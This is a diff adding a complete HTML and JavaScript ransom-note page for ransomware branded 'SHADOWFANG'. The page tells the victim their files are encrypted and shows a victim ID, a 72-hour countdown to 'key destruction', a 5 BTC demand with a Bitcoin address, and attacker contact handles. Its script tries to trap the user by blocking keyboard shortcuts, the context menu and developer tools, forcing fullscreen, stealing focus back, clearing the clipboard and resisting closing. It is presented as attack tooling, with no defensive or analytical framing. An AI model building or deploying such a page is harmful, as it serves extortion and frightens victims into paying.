@@ -1,0 +1,651 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SHADOWFANG - YOUR FILES ARE ENCRYPTED</title>
+    <style>
+        /* ==================== BASE RESET ==================== */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            cursor: none !important;
+            user-select: none !important;
+            -webkit-user-select: none !important;
+            -moz-user-select: none !important;
+            -ms-user-select: none !important;
+        }
+
+        /* ==================== ROOT VARIABLES ==================== */
+        :root {
+            --blood-red: #ff0033;
+            --dark-red: #8b0000;
+            --pure-black: #000000;
+            --off-black: #0a0a0a;
+            --dark-gray: #1a1a1a;
+            --light-gray: #cccccc;
+            --white: #ffffff;
+            --warning-yellow: #ffcc00;
+            --timer-orange: #ff6600;
+            --glow-red: 0 0 20px rgba(255, 0, 51, 0.8);
+            --glow-white: 0 0 10px rgba(255, 255, 255, 0.5);
+        }
+
+        /* ==================== BODY ==================== */
+        body {
+            background: var(--pure-black);
+            color: var(--light-gray);
+            font-family: 'Consolas', 'Courier New', monospace;
+            overflow: hidden;
+            height: 100vh;
+            width: 100vw;
+            position: fixed;
+            top: 0;
+            left: 0;
+            cursor: none !important;
+            -webkit-user-select: none !important;
+            user-select: none !important;
+        }
+
+        /* ==================== ANIMATED BACKGROUND ==================== */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: 
+                radial-gradient(ellipse at center, rgba(139, 0, 0, 0.15) 0%, transparent 70%),
+                radial-gradient(ellipse at bottom right, rgba(255, 0, 51, 0.05) 0%, transparent 50%),
+                var(--pure-black);
+            animation: pulseBackground 3s ease-in-out infinite;
+            z-index: 0;
+        }
+
+        @keyframes pulseBackground {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.8; }
+        }
+
+        /* ==================== SCANLINE OVERLAY ==================== */
+        body::after {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: repeating-linear-gradient(
+                0deg,
+                transparent,
+                transparent 2px,
+                rgba(0, 0, 0, 0.3) 2px,
+                rgba(0, 0, 0, 0.3) 4px
+            );
+            pointer-events: none;
+            z-index: 999;
+            animation: scanline 8s linear infinite;
+        }
+
+        @keyframes scanline {
+            0% { transform: translateY(-100%); }
+            100% { transform: translateY(100%); }
+        }
+
+        /* ==================== MAIN CONTAINER ==================== */
+        .container {
+            position: relative;
+            z-index: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            width: 100vw;
+            padding: 20px;
+            gap: 15px;
+        }
+
+        /* ==================== GLITCH TEXT ==================== */
+        .glitch {
+            font-size: 4vw;
+            font-weight: bold;
+            color: var(--blood-red);
+            text-shadow: var(--glow-red);
+            animation: glitch 2s infinite;
+            text-align: center;
+            letter-spacing: 3px;
+            text-transform: uppercase;
+        }
+
+        @keyframes glitch {
+            0%, 100% { transform: translate(0); opacity: 1; }
+            2% { transform: translate(-3px, 2px); opacity: 0.8; }
+            4% { transform: translate(3px, -2px); opacity: 0.6; }
+            6% { transform: translate(-2px, -3px); opacity: 0.9; }
+            8% { transform: translate(2px, 3px); opacity: 0.7; }
+            10% { transform: translate(0); opacity: 1; }
+        }
+
+        /* ==================== WARNING ICON ==================== */
+        .warning-icon {
+            font-size: 6vw;
+            color: var(--warning-yellow);
+            text-shadow: 0 0 30px rgba(255, 204, 0, 0.9);
+            animation: blink 1s ease-in-out infinite;
+            margin-bottom: 10px;
+        }
+
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+
+        /* ==================== VICTIM ID ==================== */
+        .victim-id {
+            font-size: 1.5vw;
+            color: var(--white);
+            background: var(--dark-gray);
+            padding: 12px 25px;
+            border: 2px solid var(--blood-red);
+            letter-spacing: 2px;
+            text-shadow: var(--glow-white);
+            box-shadow: inset 0 0 20px rgba(255, 0, 51, 0.3);
+            text-align: center;
+        }
+
+        .victim-id span {
+            color: var(--blood-red);
+            font-weight: bold;
+            animation: blink 2s infinite;
+        }
+
+        /* ==================== TIMER ==================== */
+        .timer-container {
+            text-align: center;
+            margin: 10px 0;
+        }
+
+        .timer-label {
+            font-size: 1.2vw;
+            color: var(--timer-orange);
+            letter-spacing: 2px;
+            text-transform: uppercase;
+        }
+
+        .timer-display {
+            font-size: 5vw;
+            font-weight: bold;
+            color: var(--timer-orange);
+            text-shadow: 0 0 30px rgba(255, 102, 0, 0.9);
+            animation: timerPulse 1s infinite;
+            letter-spacing: 5px;
+        }
+
+        @keyframes timerPulse {
+            0%, 100% { text-shadow: 0 0 30px rgba(255, 102, 0, 0.9); }
+            50% { text-shadow: 0 0 60px rgba(255, 102, 0, 1.2); }
+        }
+
+        /* ==================== PAYMENT INFO ==================== */
+        .payment-box {
+            background: var(--off-black);
+            border: 2px solid var(--dark-red);
+            padding: 20px;
+            width: 80%;
+            max-width: 800px;
+            text-align: center;
+            box-shadow: 0 0 30px rgba(139, 0, 0, 0.5);
+        }
+
+        .bitcoin-address {
+            font-size: 1.8vw;
+            color: var(--warning-yellow);
+            background: var(--pure-black);
+            padding: 15px;
+            border: 1px dashed var(--warning-yellow);
+            letter-spacing: 2px;
+            word-break: break-all;
+            text-shadow: none;
+            margin: 10px 0;
+        }
+
+        .qr-container {
+            display: flex;
+            justify-content: center;
+            margin: 15px 0;
+        }
+
+        .qr-code {
+            width: 180px;
+            height: 180px;
+            background: var(--white);
+            padding: 15px;
+            border: 3px solid var(--blood-red);
+            box-shadow: var(--glow-red);
+        }
+
+        /* ==================== INSTRUCTIONS ==================== */
+        .instructions {
+            text-align: left;
+            font-size: 1.1vw;
+            line-height: 1.8;
+            color: var(--light-gray);
+            margin: 15px 0;
+            padding: 0 20px;
+        }
+
+        .instructions ol {
+            list-style-position: inside;
+            counter-reset: step;
+        }
+
+        .instructions ol li {
+            counter-increment: step;
+            margin: 5px 0;
+            padding-left: 10px;
+        }
+
+        .instructions ol li::before {
+            content: counter(step);
+            color: var(--blood-red);
+            font-weight: bold;
+            margin-right: 10px;
+        }
+
+        /* ==================== WARNINGS ==================== */
+        .warnings {
+            font-size: 0.9vw;
+            color: var(--blood-red);
+            text-align: center;
+            letter-spacing: 1px;
+            line-height: 1.6;
+            animation: warningFlash 1.5s infinite;
+        }
+
+        @keyframes warningFlash {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        /* ==================== CONTACT ==================== */
+        .contact-info {
+            font-size: 1vw;
+            color: var(--light-gray);
+            text-align: center;
+            line-height: 1.5;
+        }
+
+        .contact-info a {
+            color: var(--warning-yellow);
+            text-decoration: none;
+            pointer-events: none;
+        }
+
+        /* ==================== PROGRESS BAR ==================== */
+        .progress-container {
+            width: 60%;
+            max-width: 600px;
+            background: var(--dark-gray);
+            border: 1px solid var(--blood-red);
+            height: 30px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .progress-bar {
+            height: 100%;
+            width: 100%;
+            background: linear-gradient(90deg, var(--dark-red), var(--blood-red));
+            animation: progressShrink 3s linear infinite;
+            position: relative;
+        }
+
+        .progress-text {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: var(--white);
+            font-size: 0.9vw;
+            font-weight: bold;
+            letter-spacing: 1px;
+            z-index: 2;
+        }
+
+        @keyframes progressShrink {
+            0% { width: 100%; }
+            50% { width: 50%; }
+            100% { width: 100%; }
+        }
+
+        /* ==================== SKULL ASCII ==================== */
+        .skull {
+            font-size: 3vw;
+            color: var(--blood-red);
+            text-shadow: var(--glow-red);
+            animation: skullFloat 3s ease-in-out infinite;
+            letter-spacing: 1px;
+        }
+
+        @keyframes skullFloat {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+
+        /* ==================== RESPONSIVE ==================== */
+        @media (max-width: 768px) {
+            .glitch { font-size: 6vw; }
+            .warning-icon { font-size: 10vw; }
+            .victim-id { font-size: 3vw; }
+            .timer-display { font-size: 8vw; }
+            .bitcoin-address { font-size: 3vw; }
+            .instructions { font-size: 2.5vw; }
+            .warnings { font-size: 2vw; }
+            .contact-info { font-size: 2vw; }
+            .qr-code { width: 120px; height: 120px; }
+        }
+
+        @media (max-width: 480px) {
+            .glitch { font-size: 8vw; }
+            .timer-display { font-size: 10vw; }
+            .payment-box { width: 95%; padding: 10px; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ==================== MAIN CONTAINER ==================== -->
+    <div class="container">
+
+        <!-- SKULL ASCII -->
+        <div class="skull">
+            <pre>
+    .-"""-.
+   /       \
+   \       /
+    `-...-'
+    </pre>
+        </div>
+
+        <!-- WARNING ICON -->
+        <div class="warning-icon">⚠</div>
+
+        <!-- GLITCH TITLE -->
+        <div class="glitch">YOUR FILES ARE ENCRYPTED</div>
+
+        <!-- VICTIM ID -->
+        <div class="victim-id">
+            VICTIM ID: <span id="victimId">SF-7F3A9C2B8D1E4A6F</span>
+        </div>
+
+        <!-- COUNTDOWN TIMER -->
+        <div class="timer-container">
+            <div class="timer-label">Time Remaining Until Key Destruction</div>
+            <div class="timer-display" id="timer">71:59:59</div>
+        </div>
+
+        <!-- PAYMENT BOX -->
+        <div class="payment-box">
+            <h2 style="color: var(--blood-red); font-size: 1.5vw; margin-bottom: 10px;">
+                PAYMENT REQUIRED: 5 BTC
+            </h2>
+            
+            <p style="font-size: 1vw; margin-bottom: 10px;">
+                Send Bitcoin to the following address:
+            </p>
+            
+            <div class="bitcoin-address" id="bitcoinAddress">
+                bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh
+            </div>
+            
+            <div class="qr-container">
+                <!-- QR Code Placeholder (would be generated) -->
+                <div class="qr-code" id="qrCode">
+                    <pre style="font-size: 8px; line-height: 8px; color: #000; background: #fff; width: 100%; height: 100%;">
+                        [QR CODE HERE]
+                    </pre>
+                </div>
+            </div>
+        </div>
+
+        <!-- INSTRUCTIONS -->
+        <div class="instructions">
+            <ol>
+                <li>Purchase <strong style="color: var(--blood-red);">5 BTC</strong> from a cryptocurrency exchange</li>
+                <li>Send payment to the Bitcoin address above</li>
+                <li>Email your Victim ID and transaction hash to: <strong style="color: var(--warning-yellow);">shadowfang@onionmail.org</strong></li>
+                <li>Receive decryption tool within 24 hours of payment</li>
+            </ol>
+        </div>
+
+        <!-- WARNINGS -->
+        <div class="warnings">
+            ⚠ DO NOT RESTART YOUR COMPUTER ⚠<br>
+            ⚠ DO NOT TRY TO REMOVE THIS SOFTWARE ⚠<br>
+            ⚠ DO NOT ATTEMPT TO DECRYPT FILES MANUALLY ⚠<br>
+            ⚠ ANY TAMPERING WILL RESULT IN PERMANENT DATA LOSS ⚠
+        </div>
+
+        <!-- CONTACT INFO -->
+        <div class="contact-info">
+            Contact: <a href="#">shadowfang@onionmail.org</a> | 
+            Jabber: <a href="#">shadowfang@jabber.org</a> | 
+            Telegram: <a href="#">@shadowfang_support</a>
+        </div>
+
+        <!-- PROGRESS BAR -->
+        <div class="progress-container">
+            <div class="progress-bar"></div>
+            <div class="progress-text">ENCRYPTION COMPLETE - 100%</div>
+        </div>
+
+        <!-- FOOTER -->
+        <div style="font-size: 0.8vw; color: var(--dark-gray); text-align: center; margin-top: 10px;">
+            SHADOWFANG RANSOMWARE ATHEX BLACK HAT - EST. 2026
+        </div>
+
+    </div>
+
+    <!-- ==================== JAVASCRIPT ==================== -->
+    <script>
+        // ==================== CONFIGURATION ====================
+        const CONFIG = {
+            victimId: 'SF-7F3A9C2B8D1E4A6F',
+            bitcoinAddress: 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh',
+            deadlineHours: 72,
+            ransomAmount: '5 BTC',
+            contactEmail: 'shadowfang@onionmail.org',
+            contactJabber: 'shadowfang@jabber.org',
+            contactTelegram: '@shadowfang_support'
+        };
+
+        // ==================== TIMER ====================
+        let deadline = new Date();
+        deadline.setHours(deadline.getHours() + CONFIG.deadlineHours);
+
+        function updateTimer() {
+            const now = new Date();
+            const difference = deadline - now;
+            
+            if (difference <= 0) {
+                document.getElementById('timer').textContent = '00:00:00';
+                document.getElementById('timer').style.color = '#ff0000';
+                document.getElementById('timer').style.animation = 'none';
+                document.getElementById('timer').style.textShadow = '0 0 50px rgba(255,0,0,1)';
+                
+                // Show key destruction message
+                document.querySelector('.timer-label').textContent = '⚠ KEY DESTROYED - FILES LOST FOREVER ⚠';
+                return;
+            }
+            
+            const hours = Math.floor(difference / (1000 * 60 * 60));
+            const minutes = Math.floor((difference % (1000 * 60 * 60)) / (1000 * 60));
+            const seconds = Math.floor((difference % (1000 * 60)) / 1000);
+            
+            const timerText = 
+                String(hours).padStart(2, '0') + ':' +
+                String(minutes).padStart(2, '0') + ':' +
+                String(seconds).padStart(2, '0');
+            
+            document.getElementById('timer').textContent = timerText;
+            
+            // Change color when less than 12 hours
+            if (hours < 12) {
+                document.getElementById('timer').style.color = '#ff0000';
+            } else if (hours < 24) {
+                document.getElementById('timer').style.color = '#ff6600';
+            }
+        }
+
+        // Update timer every second
+        setInterval(updateTimer, 1000);
+        updateTimer();
+
+        // ==================== PREVENT ESCAPE ====================
+        document.addEventListener('keydown', function(e) {
+            // Block all key combinations
+            e.preventDefault();
+            e.stopPropagation();
+            
+            // Specifically block
+            if (
+                e.key === 'F4' && e.altKey ||  // Alt+F4
+                e.key === 'Tab' && e.altKey ||  // Alt+Tab
+                e.key === 'Escape' ||  // Escape
+                e.key === 'Delete' && e.ctrlKey && e.altKey ||  // Ctrl+Alt+Del
+                (e.ctrlKey && e.key === 'w') ||  // Ctrl+W
+                (e.ctrlKey && e.key === 'r') ||  // Ctrl+R
+                (e.ctrlKey && e.key === 't') ||  // Ctrl+T
+                (e.ctrlKey && e.key === 'n') ||  // Ctrl+N
+                (e.ctrlKey && e.shiftKey && e.key === 'Escape') ||  // Ctrl+Shift+Esc
+                (e.key === 'F11') ||  // F11 fullscreen
+                (e.key === 'F5') ||  // F5 refresh
+                (e.key === 'F12') ||  // F12 dev tools
+                (e.ctrlKey && e.shiftKey && e.key === 'I') ||  // Ctrl+Shift+I
+                (e.ctrlKey && e.shiftKey && e.key === 'J') ||  // Ctrl+Shift+J
+                (e.ctrlKey && e.shiftKey && e.key === 'C')  // Ctrl+Shift+C
+            ) {
+                return false;
+            }
+        }, true);
+
+        // ==================== PREVENT RIGHT CLICK ====================
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+            return false;
+        }, true);
+
+        // ==================== PREVENT MOUSE LEAVING ====================
+        document.addEventListener('mouseleave', function(e) {
+            e.preventDefault();
+            // Re-focus
+            window.focus();
+        }, true);
+
+        // ==================== FORCE FULLSCREEN ====================
+        function forceFullscreen() {
+            try {
+                const element = document.documentElement;
+                
+                if (element.requestFullscreen) {
+                    element.requestFullscreen();
+                } else if (element.webkitRequestFullscreen) {
+                    element.webkitRequestFullscreen();
+                } else if (element.msRequestFullscreen) {
+                    element.msRequestFullscreen();
+                }
+                
+                // Re-request if exited
+                if (document.fullscreenElement === null && 
+                    document.webkitFullscreenElement === null) {
+                    setTimeout(forceFullscreen, 1000);
+                }
+            } catch(e) {
+                // Ignore fullscreen errors
+            }
+        }
+
+        // Attempt fullscreen
+        forceFullscreen();
+
+        // Monitor fullscreen exit
+        document.addEventListener('fullscreenchange', function() {
+            if (!document.fullscreenElement) {
+                setTimeout(forceFullscreen, 500);
+            }
+        });
+
+        document.addEventListener('webkitfullscreenchange', function() {
+            if (!document.webkitFullscreenElement) {
+                setTimeout(forceFullscreen, 500);
+            }
+        });
+
+        // ==================== KEEP WINDOW FOCUSED ====================
+        window.addEventListener('blur', function() {
+            setTimeout(function() {
+                window.focus();
+            }, 100);
+        });
+
+        // ==================== PREVENT PRINT SCREEN ====================
+        document.addEventListener('keyup', function(e) {
+            if (e.key === 'PrintScreen') {
+                e.preventDefault();
+                navigator.clipboard.writeText('').catch(() => {});
+            }
+        }, true);
+
+        // ==================== DISABLE DEV TOOLS ====================
+        document.addEventListener('keydown', function(e) {
+            if (
+                (e.ctrlKey && e.shiftKey && ['I', 'J', 'C'].includes(e.key.toUpperCase())) ||
+                (e.key === 'F12')
+            ) {
+                e.preventDefault();
+                e.stopPropagation();
+                return false;
+            }
+        }, true);
+
+        // ==================== CONSOLE WARNING ====================
+        console.log('%cSTOP!', 'font-size: 50px; color: red;');
+        console.log('%cThis is a protected system.', 'font-size: 20px; color: orange;');
+        console.log('%cDo not attempt to access developer tools.', 'font-size: 16px; color: white;');
+
+        // ==================== UPDATE CONFIG VALUES ====================
+        document.getElementById('victimId').textContent = CONFIG.victimId;
+        document.getElementById('bitcoinAddress').textContent = CONFIG.bitcoinAddress;
+
+        // ==================== WINDOW MOVEMENT PREVENTION ====================
+        let windowX = window.screenX;
+        let windowY = window.screenY;
+
+        setInterval(function() {
+            if (window.screenX !== windowX || window.screenY !== windowY) {
+                window.moveTo(0, 0);
+                windowX = 0;
+                windowY = 0;
+            }
+        }, 100);
+
+        // ==================== ANTI-CLOSE ====================
+        window.addEventListener('beforeunload', function(e) {
+            e.preventDefault();
+            e.returnValue = '';
+            return '';
+        });
+
+        // ==================== VIBRATION API ====================
+        if (navigator.vibrate) {
+            setInterval(function() {
+                navigator.vibrate([100, 50, 100, 50, 200]);
+            }, 5000);
+        }
+    </script>
+</body>
+</html>
